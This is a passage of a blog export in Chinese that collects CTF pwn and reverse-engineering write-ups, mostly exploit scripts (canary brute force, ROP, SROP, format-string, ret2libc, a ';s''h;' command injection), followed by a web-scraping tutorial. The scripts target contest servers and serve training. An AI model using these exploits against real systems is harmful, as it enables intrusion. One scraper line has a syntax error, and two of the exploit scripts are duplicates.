[{"title":"23DAS_WP","url":"/2023/10/23/WP/23DAS_WP/","content":"\n\n\n# das\n\n## pwn1\n\n```\nfrom pwn import *\n\ncontext(arch='amd64', log_level='debug', os='linux')\n#p = process(\"./GuestBook\")\np=remote(\"node4.buuoj.cn\",27600)\npayload=b'a'*0x18+b'^'\np.sendafter(\"Please input your name: \",payload)\np.recvuntil(\"^\")\ncanary=p.recv(7)\nprint(canary)\np.sendlineafter(\"(MAX 4): \",b'3')\nsleep(1)\npayload=b'a'*(0xA8)+p64(0x0000000004012C3)\n# attach(p,\n#        '''\n#        b *0x40147d\n#        c\n#        '''\n#        )\np.sendline(payload)\npayload=b'a'*(0xA0-0x20-8)+b'a'+canary\np.sendline(payload)\npayload=b'a'*(0xA0-0x40-8)\np.sendline(payload)\n\np.interactive()\n```\n\n## pwn2\n\nPING指令里面有漏洞，本质是一个system函数，用两个;屏蔽前后的文本，再利用两个单引号绕过字符串检查\n\n;s''h;\n","categories":["参赛WP"],"tags":["DAS"]},{"title":"23国赛WP","url":"/2023/07/23/WP/23%E5%9B%BD%E8%B5%9BWP/","content":"\n# 签到题\n\n输错代码后，会看到官方提示：\n\n> python3打印文件内容：\n>\n> ```python\n> print(open('/etc/passwd').read())\n> ```\n\n可以猜测是需要通过输入代码打开什么文件，索性尝试`/flag`，输入`print(open('/flag').read())`结果如下：\n\n![1](/images_of_guosai/1.png \"1.png\")\n\n获得`flag{Od2e2ea0-0896-4ee6-a925-09acee3db3a9}}`\n\n# 国粹\n\n题干：\n\n![a](/images_of_guosai/a.png \"a.png\")\n\n![k-1685203207698-6](/images_of_guosai/k-1685203207698-6.png \"k-1685203207698-6\")\n\n可以看到最后两张图长度相同，对齐后有一定的规律\n\n+ 第一行相同牌面对应第二行的牌面没有重复的\n\n+ 第一行相同的牌面，第二行对应的牌面按照一定的顺序排列：\n\n  + 一万 到 九万\n\n  + 一饼 到 九饼\n\n  + 一条 到 九条\n\n  + 东南西北风\n\n  + 中发白\n\n  + 春夏秋冬\n\n  + 梅兰竹菊\n\n    \n\n同时题干图片中第一行第一个为空白第二行以一个为一万，可以联想到坐标轴，\n\n于是尝试将`(a,k)`对应的各个点描出：\n\n![galf](/images_of_guosai/galf.jpg \"galf.jpg\")\n\n可以隐约发现`flag{}`，对图片进行翻转操作后：\n\n![flag](/images_of_guosai/flag.png \"flag.png\")\n\n最后获得`flag{202305012359}`\n\n# Modbus\n\n题目为一个流量包，根据题干提示（还有高人指点），筛选`modbus`协议的流量包：\n\n![image-20230528001734661](/images_of_guosai/image-20230528001734661.png \"\")\n\n注意最后的`Word Count`，将前14个流量包对应的十六进制提取出来拼接获得\n\n`MMYWMX3GNEYWOXZRGAYDA===`，再通过Base32解码获得`c1f_fi1g_1000`.\n\n于是`flag{c1f_fi1g_1000}`（本题一直摸鱼，全靠队友:joy:）\n\n# Babyre\n\n打开附件`babyre.xml`可以看到`https://snap.berkeley.edu`访问将文件导入：\n\n查看关键元素（lock）代码：\n\n![image-20230528165854609](/images_of_guosai/image-20230528165854609.png \"\")\n\n尝试运行（注意在设置中开启JavaScript拓展），发现需要输入一串字符，阅读关键部分代码。\n\n![image-20230528170114677](/images_of_guosai/image-20230528170114677.png \"\")\n\n可以看到键入输进去的字符按照Unicode编码相邻异或后得到`test`\n\n![image-20230528170213070](/images_of_guosai/image-20230528170213070.png \"\")\n\n对比了`test`和`secret`的字符是否相同。\n\n所以先修改程序使其输出`secret`：\n\n![image-20230528170459851](/images_of_guosai/image-20230528170459851.png \"\")\n\n获得如下一串数字：\n\n`102 10 13 6 28 74 3 1 3 7 85 0 4 75 20 92 92 8 28 25 81 83 7 28 76 88 9 0 29 73 0 86 4 87 87 82 84 85 4 85 87 30`\n\n根据异或特性，编写逆向程序：\n\n```python\nl=[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]\nc=['f']\nfor i in range(len(l)-1):\n    c.append(chr(l[i+1]^ord(c[i])))\n\nfor c in c:\n    print(c,end='')\n```\n\n输出结果：\n\n`flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}`\n\n\n\n# Funcanary\n\n​                               \n\n用ida查看代码，发现这是一个利用fork实现无限循环的函数，\n\n同时发现一个后门函数·\n\n![image6](/images_of_guosai/image6.png \"\")\n\n![image7](/images_of_guosai/image7.png \"\")\n\n  每次会调用shuru函数\n\n查看shuru函数\n\n![image9](/images_of_guosai/image9.png \"\")\n\n发现了一个溢出点\n\n查看保护措施\n\n![image10](/images_of_guosai/image10.png \"\")\n\n ![image8](/images_of_guosai/image8.png \"\")\n\n保护全开\n\n查看栈结构\n\n![image11](/images_of_guosai/image11.png \"\")\n\n思路明确了，想办法绕开金丝雀值，修改返回地址到后门函数上\n\n而结合无限循环的特性，我可以写一个脚本来逐位爆破canary值，而结合题目的保护设施，后门函数的地址也会变，所以我再写一个爆破脚本，通过最多500次尝试找出正确的后门\n\nExp：\n\n \n\n```\n\n\n\\#coding=utf8\n\nfrom pwn import *\n\nimport random\n\n\\# context.log_level = 'debug'\n\n\\# context.terminal = ['gnome-terminal','-x','bash','-c']\n\n\\# context(arch='i386',os='linux')\n\np = remote('47.93.249.245','13230')\n\n \n\n \n\ncanary = b'\\x00'\n\nfor k in range(7):\n\n  for i in range(256):\n\n​    \\# print(\"正在爆破Canary的第\" + str(k+1) + \"位\")\n\n​    \\# print(\"当前的字符为\" + chr(i))\n\n​    p.recvuntil(b\"welcome\\n\")\n\n​    payload = b'a' * 104 + canary + p8(i)\n\n​    \\#print(\"当前payload为：\", payload)\n\n​    p.send(b'a' * 104 + canary + p8(i))\n\n​    data = p.recvuntil(b'fun',timeout=0.4)\n\n​    \\# print(data)\n\n​    if b\"fun\" in data:\n\n​      canary += p8(i)\n\n​      print(b\"Canary is: \" + canary)\n\n​      break\n\nprint(b'can',hex(u64(canary)))\n\npause()\n\ncontext.log_level='debug'\n\nfor k in range(500):\n\n  p.recvuntil(b'welcome\\n')\n\n  i=random.randint(0,14)\n\n  payload = b'A'*104 +canary+p64(0x7fffffffdddddddd) + p8(0x31)+p8(0x02+i*16)\n\n  p.send(payload)\n```\n\n \n\n","categories":["参赛WP"]},{"title":"23春校赛WP","url":"/2023/07/23/WP/23%E6%98%A5%E6%A0%A1%E8%B5%9BWP/","content":"\n# 签到：\n\n在微信公众号发送flag，得到flag\n\n# Base：\n\n 十六进制转base64，再转随波逐流一把梭\n\n# Rot13：\n\n就一层加密，rot13解密后套flag\n\n# Rsa：\n\n百度到原题复制粘贴\n\n# 山岚：\n\n谐音“栅栏”，随波逐流一把梭\n\n# Miao：\n\n查看ida，发现直接给了shell，尝试cat flag结果输出喵喵喵\n\n尝试套flag{}错误，后来尝试后发现禁用cat，一旦cat就会喵喵喵，找到Linux等效的指令\n\n# Baby_re：\n\n看不到main函数，查壳，发现upx壳，upx -d一键脱壳，解数独类逆向，gdb调试出数独表，找到网站解出\n\n[ikun下载](/downloads_xiaosai/ikun)\n\n[人生重开下载](/downloads_xiaosai/life)\n\n# ikun——随机数的应对，双程序的应用\n\n```python\nfrom pwn import *\n\ncontext(log_level = \"debug\",arch = \"amd64\",os = \"linux\")\nelf=ELF(\"./ikun\")\nputs_got = elf.got[\"puts\"]\nshell=elf.sym[\"realback\"]\nprint(hex(shell))\noffset = 12\nprint(hex(shell))\npayload2 = fmtstr_payload(offset, {puts_got: shell})\ns=process(\"./suiji\")\np=process(\"./ikun\")\npayload1=\"kunaaaaaaaa@\"\np.send(payload1)\np.recvuntil(\"@\")\nsand = u64(p.recvuntil('\\x64')[-6:].ljust(8, b'\\x00'))\ns.sendline(str(sand))\nfor i in range(114):\n    t=s.recvline()\n    p.sendafter(\"do:(c/t/r/l)\",t)\n    s.sendline()\np.sendafter(\"Input what you want to say\",payload2)\n\np.interactive()\n```\n\nsuiji为自行编写的c程序，代码如下\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint main()\n{\n  unsigned int seed; \n  int random_number; \n  int i; \n  scanf(\"%u\", &seed);\n  getchar(); //consume extra newline character\n  srand(seed);\n  for (i = 0; i <= 113; ++i)\n  {\n    random_number = rand() % 4;\n    if (random_number == 0)\n    {\n      printf(\"%c\\n\", 'c');\n    }\n    else if (random_number == 1)\n    {\n      printf(\"%c\\n\", 't');\n    }\n    else if (random_number == 2)\n    {\n      printf(\"%c\\n\", 'r');\n    }\n    else\n    {\n      printf(\"%c\\n\", 'l');\n    }\n    getchar(); //wait for user input to proceed to next iteration\n  }\n  return 0;\n}\n\n```\n\n使用这样的程序嵌套，可以避免被一些绕过性的问题打断脚本\n\n\n\n# 人生重开模拟器——调用文件时多次服务器连接造成漏洞\n\n**有三个函数调用了一个文件，漏洞就出自这里，由于在同一个端口，所以nc服务器以后会使用同一个文件，可以巧妙地利用文件操作，使其中一个窗口的钱数超过200万**\n\n![img](file:///C:/Users/heshi/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png)\n\n**初始钱数，这个函数会将money.txt中的钱置零，所以在使用多个窗口时，要先触发这个函数，跳过以后再执行**\n\n![img](file:///C:/Users/heshi/AppData/Local/Temp/msohtmlclip1/01/clip_image004.png)\n\n \n\n![img](file:///C:/Users/heshi/AppData/Local/Temp/msohtmlclip1/01/clip_image006.png)\n\n**这个函数会根据参数增加钱数，保存到文件中**\n\n**思路：**\n\n**开20个窗口，全部进行到取名字以后**\n\n**如果出现“你爸爸告诉你家里面很有钱”，直接把这个窗口关掉，不然会导致扣掉一百万**\n\n**出现其他的字样，保留**\n\n**随后我们就可以在剩余的窗口里面赚钱（初始的钱数也会叠加）**\n\n**钱到达200万，创业，get shell**\n","categories":["参赛WP"]},{"title":"polarCTF的WP","url":"/2023/09/23/WP/polarCTF%E7%9A%84WP/","content":"\n# play\n\n```\nfrom pwn import *\np = remote(\"123.60.135.228\", 2102)\n\nelf = ELF(\"play\")\ncontext(log_level = \"debug\",arch = \"amd64\",os = \"linux\")\n\nbuf=0x00000000006010A0\nshellcode = asm(shellcraft.sh())\np.sendlineafter('I think you must enjoy playing.',shellcode)\n\npayload=(0x30+8)*b'a'+p64(buf)\n\np.sendlineafter(\"Name your favorite game?\",payload)\n\np.interactive()\n```\n\n\n\n# name4\n\n```\nfrom pwn import *\np = remote(\"123.60.135.228\",2082)\n#p=process('name4')\n\ncontext(log_level = \"debug\",arch = \"i386\",os = \"linux\")\nstart=0x0804869E\nread=0x08048410\nbuf=0xff8f8000\nshellcode =asm(shellcraft.sh())\npayload1=p32(0)\np.sendlineafter('Enter your name:',payload1)\np.sendlineafter('Enter your best friend name:',b'1')\n\npayload2=(0x20+4)*b'a'+p32(read)+p32(buf)+p32(0)+p32(buf)+p32(100)\n#attach(p)\np.sendlineafter(\"give you stack overflow:\",payload2)\n#attach(p)\np.sendlineafter(\"byebye\",shellcode)\n\n\np.interactive()\n```\n\n\n\n# dog\n\n```\nfrom pwn import *\np = remote(\"123.60.135.228\",2084)\n#p=process('name4')\ncontext(log_level = \"debug\",arch = \"i386\",os = \"linux\")\n\npayload=b'a'*(9+4)+p32(0x0804859B)\np.sendlineafter(\"This puppy needs to eat a few bones?\",payload)\n\np.interactive()\n\n```\n\n\n\n# fish\n\n```\nfrom pwn import *\np = remote(\"123.60.135.228\",2149)\n#p=process('fish')\ncontext(log_level = \"debug\",arch = \"i386\",os = \"linux\")\npayload=(0x6C+4)*b'a'+p32(0x08048450)+p32(0x08048480)+p32(0x0804A080)+p32(0x0804A080)\n#                             gets           sys          buf              buf\np.sendline(payload)\np.sendline(b'/bin/sh')\np.interactive()\n```\n\n# fmt\n\n```\nfrom pwn import *\np = remote(\"123.60.135.228\",2076)\n#p=process('fish')\nn=0x0804A030\npayload = fmtstr_payload(6, {n : 4})\np.sendlineafter(\"What's your name?\",payload)\np.interactive()\n```\n\n# 03ret2syscall_32\n\n```\nfrom pwn import *\na = remote(\"123.60.135.228\",2136)\n#a=process('03ret2syscall_32')\np = (0x208+4)*b'a'\n# ROP chain for 32-bit\n# pop edx ; ret\np = (0x208+4)*b'a'\n\np += p32(0x0806f22a) # pop edx ; ret\np += p32(0x080ea060) # @ .data\np += p32(0x080b8576) # pop eax ; ret\np += b'/bin'\np += p32(0x08054b8b) # mov dword ptr [edx], eax ; ret\np += p32(0x0806f22a) # pop edx ; ret\np += p32(0x080ea064) # @ .data + 4\np += p32(0x080b8576) # pop eax ; ret\np += b'//sh'\np += p32(0x08054b8b) # mov dword ptr [edx], eax ; ret\np += p32(0x0806f22a) # pop edx ; ret\np += p32(0x080ea068) # @ .data + 8\np += p32(0x080494b3) # xor eax, eax ; ret\np += p32(0x08054b8b) # mov dword ptr [edx], eax ; ret\np += p32(0x080481c9) # pop ebx ; ret\np += p32(0x080ea060) # @ .data\np += p32(0x080ded85) # pop ecx ; ret\np += p32(0x080ea068) # @ .data + 8\np += p32(0x0806f22a) # pop edx ; ret\np += p32(0x080ea068) # @ .data + 8\np += p32(0x080494b3) # xor eax, eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0807ac0f) # inc eax ; ret\np += p32(0x0806cea3) # int 0x80\n\n\na.sendlineafter(\"Good Luck.\",p)\na.interactive()\n```\n\n\n\n# sleep\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\np = remote(\"123.60.135.228\",2082)\n#p= process('./sleep')\ncontext.log_level=\"debug\"\nelf=ELF(\"sleep\")\nmain_addr = 0x0000000004006BD\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\ngets_plt = 0x000000000400550\npop_rdi_ret=0x0000000000400783\n\npayload =b'a' * (0x70+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)+p64(main_addr)\n#attach(p)\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload)\n#p.interactive()\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = 0x0000000000601040\nret_addr = 0x0000000000400501\n#attach(p)\npayload2 = b'a' * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(0x000000000601040)+p64(gets_plt)+p64(ret_addr)+p64(main_addr)\n\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload2)\nsleep(2)\np.sendline(b'/bin/sh\\0')\n\n\n\npayload2 = b'a' * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)\np.sendlineafter(\"Please cherish every second of sleeping time !!!\",payload2)\np.interactive()\n```\n\n\n\n","categories":["参赛WP"]},{"title":"爬虫及excel文件操作","url":"/2023/12/02/%E7%88%AC%E8%99%AB%E5%8F%8Aexcel%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","content":"\n# 爬我的网站\n\n## 完整代码\n\n```\nimport pandas as pd\nfrom bs4 import BeautifulSoup\nimport requests\n\npage=requests.get(\"http://47.99.105.206:8080/\")\ncontext=page.text\n\nsoup = BeautifulSoup(context, 'html.parser')\ntd_elements = soup.find_all('td', {'bgcolor': '#eeeeee'})\n\n# 初始化变量以保存学号和分数\nstudent_id = None\nscore = None\ndata = {}\nxuehao = []\nfenshu = []\nfor i, td_element in enumerate(td_elements):\n    if i%18 != 17 and i%18 != 16:\n        continue\n    num = i // 18\n    if i % 18 == 16:  # 根据示例中的位置确定分数所在的索引\n        score = td_element.text.strip()\n        fenshu.append(score)\n    if i % 18 == 17:\n        student_id = td_element.text.strip()\n        xuehao.append(student_id)\n\n# 打印学号和分数\ndata[\"学号\"]=xuehao\ndata[\"分数\"]=fenshu\n\n# 将字典转换为DataFrame\ndf = pd.DataFrame(data)\n\n# 指定Excel文件路径\nexcel_file_path = '分数.xlsx'\n\n# 将DataFrame写入Excel文件\ndf.to_excel(excel_file_path, index=False, engine='openpyxl')\n\nprint(f'DataFrame写入Excel文件成功，文件路径为: {excel_file_path}')\n```\n\n## 用到的库\n\n```\nrequests：拿取html用\nBeautifulSoup：解析html\npandas：数据处理到excel\n```\n\n## pandas基础操作\n\n```\nimport pandas as pd\n\n# 读取Excel文件\ndf = pd.read_excel('文件路径.xlsx')\n\n# 写入Excel文件\ndf.to_excel('输出文件.xlsx', index=False)\n\n\n\n\n```\n\n## requests基本操作\n\n**发送 GET 请求：**\n\n```\npython\nimport requests\n\nresponse = requests.get('https://example.com')\n```\n\n**发送 POST 请求：**\n\n```\npython\nimport requests\n\ndata = {'key1': 'value1', 'key2': 'value2'}\nresponse = requests.post('https://example.com/post', data=data)\n```\n\n**发送带参数的 GET 请求：**\n\n```\npython\nimport requests\n\nparams = {'param1': 'value1', 'param2': 'value2'}\nresponse = requests.get('https://example.com/get', params=params)\n```\n\n**处理响应：**\n\n```\npython\nimport requests\n\nresponse = requests.get('https://example.com')\n\n# 获取响应状态码\nstatus_code = response.status_code\n\n# 获取响应内容\ncontent = response.text\n```\n\n**处理 JSON 响应：**\n\n```\npython\nimport requests\n\nresponse = requests.get('https://api.example.com/data')\n\n# 将JSON响应转换为字典\njson_data = response.json()\n```\n\n**自定义请求头：**\n\n```\npython\nimport requests\n\nheaders = {'User-Agent': 'my-app/1.0'}\nresponse = requests.get('https://example.com', headers=headers)\n```\n\n**处理异常：**\n\n```\npython\nimport requests\n\ntry:\n    response = requests.get('https://example.com')\n    response.raise_for_status()  # 检查是否有错误状态码\nexcept requests.exceptions.HTTPError as errh:\n    print(f\"HTTP Error: {errh}\")\nexcept requests.exceptions.ConnectionError as errc:\n    print(f\"Error Connecting: {errc}\")\nexcept requests.exceptions.RequestException as err:\n    print(f\"An unexpected error occurred: {err}\")\n```\n\n**文件上传：**\n\n```\npython\nimport requests\n\nfiles = {'file': ('filename.txt', open('filename.txt', 'rb'))}\nresponse = requests.post('https://example.com/upload', files=files)\n```\n\n## BeautifulSoup示例\n\n```\nfrom bs4 import BeautifulSoup\n\n# HTML示例字符串\nhtml = \"\"\"\n<html>\n<head>\n    <title>BeautifulSoup Example</title>\n</head>\n<body>\n    <div id=\"content\">\n        <h1>Sample Page</h1>\n        <p class=\"paragraph\">This is a sample paragraph.</p>\n        <ul>\n            <li>Item 1</li>\n            <li>Item 2</li>\n            <li>Item 3</li>\n        </ul>\n    </div>\n</body>\n</html>\n\"\"\"\n\n# 创建BeautifulSoup对象\nsoup = BeautifulSoup(html, 'html.parser')\n\n# 查找特定标签\ntitle_tag = soup.title\nh1_tag = soup.h1\n\n# 获取标签内容\ntitle_text = title_tag.text\nh1_text = h1_tag.text\n\n# 查找所有段落标签\nparagraphs = soup.find_all('p')\n\n# 遍历并输出段落内容\nfor p in paragraphs:\n    print(\"Paragraph:\", p.text)\n\n# 查找并输出列表项\nlist_items = soup.find_all('li')\nfor li in list_items:\n    print(\"List Item:\", li.text)\n\n```\n\n# 爬新闻头条\n\n## 完整代码\n\n```\nfrom bs4 import BeautifulSoup\nimport requests\n\npage=requests.get(\"https://top.baidu.com/board?platform=pc&tab=homepage&sa=pc_index_homepage_all\")\ncontext=page.text\nsoup=BeautifulSoup(context,'html.parser')\ntitles = soup.find_all('div', class_='c-single-text-ellipsis')\nfor i,title in enumerate(titles):\n    if i % 2==1 or i >21:\n        continue\n    print(i//2,title.text)\n```\n\n## 学到的内容\n\n```\ntitles = soup.find_all('div', class_='c-single-text-ellipsis')\n\nfor i,title in enumerate(titles):\n```\n\n# 爬百度百科\n\n## 代码\n\n```\nimport requests\nimport os\nfrom bs4 import BeautifulSoup\nfrom tkinter import Tk, Label, PhotoImage\nfrom PIL import Image, ImageTk\nimport json\n\ndef download_image(url, save_path, file_name):\n    try:\n        # 发送请求获取图片数据\n        response = requests.get(url)\n        response.raise_for_status()  # 检查请求是否成功\n        try:\n            os.makedirs(\"picture\")\n        except:\n            pass\n        # 拼接保存路径和文件名\n        file_path = os.path.join(save_path, file_name)\n\n        # 将图片数据保存到文件\n        with open(file_path, 'wb') as img_file:\n            img_file.write(response.content)\n\n        print(f\"图片已成功下载到: {file_path}\")\n\n    except requests.exceptions.RequestException as e:\n        print(f\"下载图片时发生错误: {e}\")\n\n\ndef show_actor(name, image_path):\n    try:\n        root = Tk()\n        root.title(\"演员展示\")\n\n        # 显示演员名字\n        label_name = Label(root, text=name, font=(\"Helvetica\", 16))\n        label_name.pack()\n\n        # 显示演员图片\n        img = Image.open(image_path)\n        img = img.resize((400, 400), Image.LANCZOS)\n        photo = ImageTk.PhotoImage(img)\n\n        label_image = Label(root, image=photo)\n        label_image.image = photo  # 保持引用，避免被垃圾回收\n        label_image.pack()\n\n        root.mainloop()\n    except:\n        print(\"暂无该演员图片\")\n        pass\n\n\ndef getinfo():\n    actor_name=[]\n    url = \"https://baike.baidu.com/item/%E7%8B%82%E9%A3%99\"\n    response = requests.get(url)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    table = soup.find_all('div', class_='actorItem_ptZyH')\n    for actor in table:\n        actor_info = actor.find_all(\"span\", class_=\"text_argYK\")\n        name = actor_info[0].text\n        charactor = actor_info[1].text\n        print(\"演员姓名：\", name)\n        print(\"演员角色：\", charactor)\n        actor_name.append(name+\" 饰 \"+charactor)\n        actor_pic = actor.find(\"div\", class_=\"coverPic_e6cDt\").find(\"img\").get(\"src\")\n        if actor_pic != \"https://baikebcs.bdimg.com/baike-react/lemma/actor.png\":\n            download_image(actor_pic, \"./picture/\", name + \".png\")\n    with open(\"name.json\", 'w') as f:1\n        json.dump(actor_name,f)\n\ndef show():\n    with open(\"name.json\", 'r') as f:\n        actor_name=json.load(f)\n    for name in actor_name:\n        print(name)\nprint(\"[1]爬取《狂飙》所有演员图片\")\nprint(\"[2]查看演员列表\")\nprint(\"[3]查看图片\")\nwhile 1:\n    choice = input(\"请输入选择\")\n    if choice == \"1\":\n        getinfo()\n    if choice == \"2\":\n        show()\n    if choice == \"3\":\n        name = input(\"请输入演员名\")\n        show_actor(name, f\"./picture/{name}.png\")\n```\n","categories":["业余爱好"],"tags":["excel"]},{"title":"23秋校赛WP","url":"/2023/10/25/WP/%E7%A7%8B%E6%A0%A1%E8%B5%9BWP/","content":"\n# 个人信息\n\n比赛昵称：不会pwn就哭\n\n姓名：贺宇超\n\n# ezlogin\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\n#p=process('./maybeheap')\n\n\nfor i in range(1,20):\n    p = remote(\"ctf.v50to.cc\", 10468)\n    p.sendlineafter(\"Choice:\", b'1')\n    #attach(p)\n    p.sendlineafter(\"Enter index (0-9) to add a new Chunk: \", str(i*-1))\n\n    p.sendlineafter(\"Enter name for the new Chunk (up to 16 characters): \", p64(0x0401228))\n    p.interactive()\n```\n\n# maybeheap\n\n```\nfrom pwn import *\ncontext.log_level=\"debug\"\n#p=process('./maybeheap')\n\n\nfor i in range(1,20):\n    p = remote(\"ctf.v50to.cc\", 10468)\n    p.sendlineafter(\"Choice:\", b'1')\n    #attach(p)\n    p.sendlineafter(\"Enter index (0-9) to add a new Chunk: \", str(i*-1))\n\n    p.sendlineafter(\"Enter name for the new Chunk (up to 16 characters): \", p64(0x0401228))\n    p.interactive()\n\n\n```\n\n# ezcsu（企图用非srop的方法做，练练手，有个寄存器没法控制，失败了）\n\n```\nfrom pwn import *\ncontext(os = 'linux', arch = 'amd64')\ncontext.log_level=\"debug\"\np=process('./ezcsu')\n#p = remote(\"ctf.v50to.cc\", 11295)\nrdi_ret=0x00000000004007f3\nrsi_r15_ret=0x00000000004007f1\neax_0_leave_ret=0x00000000040075C\nsys_1_write=0x0000000000400777\nsys_ret=0x000000000040077E\nmain=0x0000000004006F3\nrbp_ret=0x0000000000400620\none=0x45226\nrbx_rbp_r12_13_14_15=0x0000000004007EA\nset_eax_0=0x000000000400727\n\n\npayload=0x68*b'a'+p64(rdi_ret)+p64(0)+p64(rsi_r15_ret)+p64(0x000000000601038)+p64(0)+p64(sys_ret)\\\n        +p64(0x000000000400727)+p64(rsi_r15_ret)+p64(0x000000000601040)+p64(0)\\\n        +p64(sys_ret)+p64(rbp_ret)+p64(0x000000000601038)+p64(eax_0_leave_ret)\np.sendlineafter(\" power!!\",payload)\n\npause()\npayload=p64(0x00000000004007f2)\np.send(payload)\n\npause()\nattach(p)\npayload=p64(rsi_r15_ret)+p64(0x000000000601008)+p64(0)+p64(sys_ret)\\\n        +p64(set_eax_0)+p64(rsi_r15_ret)+p64(0x00000000060100a)+p64(0)+p64(sys_ret)\\\n    +p64(rdi_ret)+p64(0x000000000601008)+p64(sys_ret)+p64(set_eax_0)\\\n    +p64(rdi_ret)+p64(3)+p64(rsi_r15_ret)+p64(0x3fd000)+p64(0)+p64(sys_ret)\\\n    +p64(rdi_ret)+p64(1)+p64(rsi_r15_ret)+p64(0x3fd000)+p64(0)+p64(sys_ret)\np.send(payload)\npause()\n\np.send(b'fl')\npause()\np.send(b'ag')\np.interactive()\n\n\n\n```\n\n# ezcsu（最终版）\n\n```\nfrom pwn import *\ncontext(os = 'linux', arch = 'amd64')\ncontext.log_level=\"debug\"\n#p=process('./ezcsu')\np = remote(\"ctf.v50to.cc\", 11295)\nrdi_ret=0x00000000004007f3\nrsi_r15_ret=0x00000000004007f1\neax_0_leave_ret=0x00000000040075C\nsys_1_write=0x0000000000400777\nsys_ret=0x000000000040077E\nmain=0x0000000004006F3\nrbp_ret=0x0000000000400620\none=0x45226\nrbx_rbp_r12_13_14_15=0x0000000004007EA\nset_eax_0=0x000000000400727\n\n\npayload=0x68*b'a'+p64(rdi_ret)+p64(0)+p64(rsi_r15_ret)+p64(0x000000000601038)+p64(0)+p64(sys_ret)\\\n        +p64(0x000000000400727)+p64(rsi_r15_ret)+p64(0x000000000601040)+p64(0)\\\n        +p64(sys_ret)+p64(rbp_ret)+p64(0x000000000601038)+p64(eax_0_leave_ret)\np.sendlineafter(\" power!!\",payload)\n\n#pause()\npayload=p64(0x00000000004007f2)\np.send(payload)\n\nframe = SigreturnFrame(kernel=\"amd64\")\nframe.rax = 59\nframe.rdi = 0x000000000601008\nframe.rsi = 0\nframe.rdx = 0\nframe.rip = sys_ret\n\npayload=p64(rsi_r15_ret)+p64(0x000000000601008)+p64(0)+p64(sys_ret)+p64(sys_ret)+b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x10`\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00~\\x07@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x003\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n#attach(p)\npause()\np.send(payload)\n\np.send(b'/bin/sh\\x00'+b'a'*7)\n\np.interactive()\n\n\n\n\n\n'''\n0x00000000004007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000004007ee : pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000004007f0 : pop r14 ; pop r15 ; ret\n0x00000000004007f2 : pop r15 ; ret\n0x00000000004007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000004007ef : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000400620 : pop rbp ; ret\n0x00000000004007f3 : pop rdi ; ret\n0x00000000004007f1 : pop rsi ; pop r15 ; ret\n0x00000000004007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000400539 : ret\n0x0000000000400542 : ret 0x200a\n\n\n'''\n```\n\n\n\n# 人生重开（做过，省略）\n\n\n\n# ezcheckin\n\n好多后门，一个知识点：Linux命令“;”表示再执行下一条，而sh单独也可以作为shell\n\n所以溢出返回地址到;sh那一条去\n\n# ezrop\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\n\ncontext(arch='amd64', log_level='debug', 